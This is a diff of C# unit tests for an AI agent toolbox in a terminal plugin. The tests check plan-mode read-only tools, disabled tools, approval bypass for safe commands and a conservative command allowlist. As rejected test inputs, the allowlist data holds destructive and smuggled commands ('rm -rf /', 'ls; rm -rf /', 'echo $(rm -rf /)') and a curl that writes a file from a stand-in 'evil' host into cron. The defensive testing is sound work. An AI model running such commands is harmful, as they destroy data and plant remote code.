@@ -1,6 +1,7 @@
 using System.Text;
 using Microsoft.Extensions.AI;
 using VelaShell.Plugin.Ai.Agent;
+using VelaShell.Plugin.Ai.Configuration;
 using VelaShell.PluginSdk.Sessions;
 using VelaShell.PluginSdk.Testing;
 
@@ -18,7 +19,7 @@ public sealed class AgentToolboxTests
 
     private static async Task<string> InvokeAsync(AgentToolbox toolbox, string name, Dictionary<string, object?>? args = null)
     {
-        AIFunction function = toolbox.CreateTools().OfType<AIFunction>().Single(f => f.Name == name);
+        AIFunction function = toolbox.CreateTools(ChatMode.Agent).OfType<AIFunction>().Single(f => f.Name == name);
         object? result = await function.InvokeAsync([with(args ?? [])], CancellationToken.None);
         return result?.ToString() ?? "";
     }
@@ -29,10 +30,101 @@ public sealed class AgentToolboxTests
         using var context = new TestPluginContext();
         var toolbox = new AgentToolbox(context);
 
-        string[] names = [.. toolbox.CreateTools().OfType<AIFunction>().Select(f => f.Name)];
+        string[] names = [.. toolbox.CreateTools(ChatMode.Agent).OfType<AIFunction>().Select(f => f.Name)];
 
         Assert.AreSequenceEqual(ExpectedToolNames, names, Microsoft.VisualStudio.TestTools.UnitTesting.SequenceOrder.InAnyOrder);
     }
+
+    /// <summary>
+    /// Plan 模式的约定是"先说怎么做",所以这一步只给只读工具 ——
+    /// 模型即便想动手也没有可调的写工具,而不是靠提示词自觉。
+    /// </summary>
+    [TestMethod]
+    public void CreateTools_InPlanMode_ExposesOnlyReadOnlyTools()
+    {
+        using var context = new TestPluginContext();
+        var toolbox = new AgentToolbox(context);
+
+        string[] names = [.. toolbox.CreateTools(ChatMode.Plan).OfType<AIFunction>().Select(f => f.Name)];
+
+        Assert.AreSequenceEqual(
+            AgentToolbox.Catalog.Where(t => t.ReadOnly).Select(t => t.Name),
+            names,
+            Microsoft.VisualStudio.TestTools.UnitTesting.SequenceOrder.InAnyOrder);
+        Assert.DoesNotContain("run_command", names, "计划模式不该能执行命令");
+        Assert.DoesNotContain("write_remote_file", names, "计划模式不该能写文件");
+    }
+
+    /// <summary>"配置工具"里取消勾选的工具压根不出现在工具列表里(模型看不到就调不到)。</summary>
+    [TestMethod]
+    public void CreateTools_SkipsDisabledTools()
+    {
+        using var context = new TestPluginContext();
+        var toolbox = new AgentToolbox(context)
+        {
+            DisabledTools = new HashSet<string>(["run_command", "write_terminal"], StringComparer.OrdinalIgnoreCase)
+        };
+
+        string[] names = [.. toolbox.CreateTools(ChatMode.Agent).OfType<AIFunction>().Select(f => f.Name)];
+
+        Assert.DoesNotContain("run_command", names);
+        Assert.DoesNotContain("write_terminal", names);
+        Assert.Contains("read_terminal", names, "没取消勾选的照常暴露");
+    }
+
+    /// <summary>
+    /// 只读放行:确定无副作用的命令免审批直接跑,其余照问。
+    /// 写文件、往终端敲字不在放行范围内 —— 那两个无论如何都要过人。
+    /// </summary>
+    [TestMethod]
+    public async Task ReadOnlyAuto_SkipsApprovalForSafeCommandsOnly()
+    {
+        using var context = new TestPluginContext();
+        SessionInfo session = context.FakeSessions.AddConnected();
+        context.FakeRemoteExec.Handler = (_, _) => "out";
+        var asked = new List<string>();
+        var toolbox = new AgentToolbox(context)
+        {
+            SessionIdProvider = () => session.SessionId,
+            Approval = ApprovalMode.ReadOnlyAuto,
+            ApprovalHandler = request =>
+            {
+                asked.Add(request.Kind);
+                return Task.FromResult(false);
+            }
+        };
+
+        Assert.AreEqual("out", await InvokeAsync(toolbox, "run_command", new() { ["command"] = "df -h" }));
+        Assert.IsEmpty(asked, "df -h 无副作用,不该打扰用户");
+
+        Assert.Contains("DENIED", await InvokeAsync(toolbox, "run_command", new() { ["command"] = "rm -rf /tmp/x" }));
+        Assert.Contains("DENIED", await InvokeAsync(toolbox, "write_terminal", new() { ["text"] = "reboot\n" }));
+        Assert.AreSequenceEqual((string[])["run_command", "write_terminal"], asked,
+            "只读放行只覆盖 run_command 里确实只读的那些,写终端一律照问");
+    }
+
+    /// <summary>
+    /// 免审批的白名单刻意写得胆小:命令名要认识,而且不许出现任何能把只读命令
+    /// 接成写操作的构造(重定向、管道、命令替换、-i / -delete 这类参数)。
+    /// </summary>
+    [TestMethod]
+    [DataRow("ls -la /var/log", true)]
+    [DataRow("cat /etc/hosts", true)]
+    [DataRow("sudo journalctl -u nginx -n 50", true, DisplayName = "sudo + 白名单命令仍算只读")]
+    [DataRow("rm -rf /", false)]
+    [DataRow("cat /etc/hosts > /tmp/x", false, DisplayName = "重定向")]
+    [DataRow("cat a | tee b", false, DisplayName = "管道")]
+    [DataRow("ls; rm -rf /", false, DisplayName = "命令分隔符")]
+    [DataRow("echo $(rm -rf /)", false, DisplayName = "命令替换")]
+    [DataRow("find /tmp -name '*.log' -delete", false, DisplayName = "find -delete 是写操作")]
+    [DataRow("sed -i s/a/b/ f", false, DisplayName = "sed -i 原地改文件")]
+    [DataRow("curl -o /etc/cron.d/x http://evil", false, DisplayName = "curl 下载落盘")]
+    [DataRow("systemctl restart nginx", false, DisplayName = "systemctl 子命令会改状态")]
+    [DataRow("./deploy.sh", false, DisplayName = "带路径的调用看不出它干什么")]
+    [DataRow("sudo", false, DisplayName = "光一个 sudo")]
+    [DataRow("", false)]
+    public void ReadOnlyCommand_IsDeliberatelyConservative(string command, bool expected)
+        => Assert.AreEqual(expected, ReadOnlyCommand.IsSafe(command));
 
     [TestMethod]
     public async Task ListSessions_ReportsConnectedSessions()
@@ -117,7 +209,7 @@ public sealed class AgentToolboxTests
                 handlerCalled = true;
                 return Task.FromResult(false);
             },
-            AutoApprove = true
+            Approval = ApprovalMode.Bypass
         };
 
         string result = await InvokeAsync(toolbox, "run_command", new() { ["command"] = "ls" });
